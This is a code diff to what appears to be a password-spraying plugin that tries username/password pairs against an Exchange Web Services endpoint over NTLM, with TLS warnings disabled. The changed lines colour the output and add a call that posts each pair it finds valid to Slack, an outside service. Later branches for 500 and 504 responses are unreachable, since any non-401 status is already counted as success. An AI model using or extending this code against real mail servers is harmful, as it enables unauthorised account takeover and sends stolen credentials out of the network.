@@ -3,7 +3,6 @@ from requests_ntlm import HttpNtlmAuth
 import utils.utils as utils
 requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
-
 def ews_authenticate(url, username, password, useragent, pluginargs):
 
     ts = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
@@ -48,11 +47,19 @@ def ews_authenticate(url, username, password, useragent, pluginargs):
 
         if resp.status_code != 401:
             data_response['success'] = True
-            data_response['output'] = f"[+] Found credentials, code: {resp.status_code}: {username}:{password}"
-
+            data_response['output'] = utils.prGreen(f"[+] Found credentials, code: {resp.status_code}: {username}:{password}")
+            utils.slacknotify(username, password)
+        elif resp.status_code == 500:
+            data_response['output'] = utils.prYellow(f"[*] WARNING: Found credentials, but server returned 500: {username}:{password}")
+            data_response['success'] = False 
+            utils.slacknotify(username, password)
+        elif resp.status_code == 504:
+            data_response['output'] = utils.prYellow(f"[*] Potential Credentials, but server returned 504: {username}:{password}")
+            data_response['success'] = False 
         else:
             data_response['success'] = False
-            data_response['output'] = f"[-] Authentication failed: {username}:{password} (Invalid credentials)"
+            data_response['output'] = utils.prRed(f"[-] Authentication failed: {username}:{password} (Invalid credentials)")
+
 
     except Exception as ex:
         data_response['error'] = True
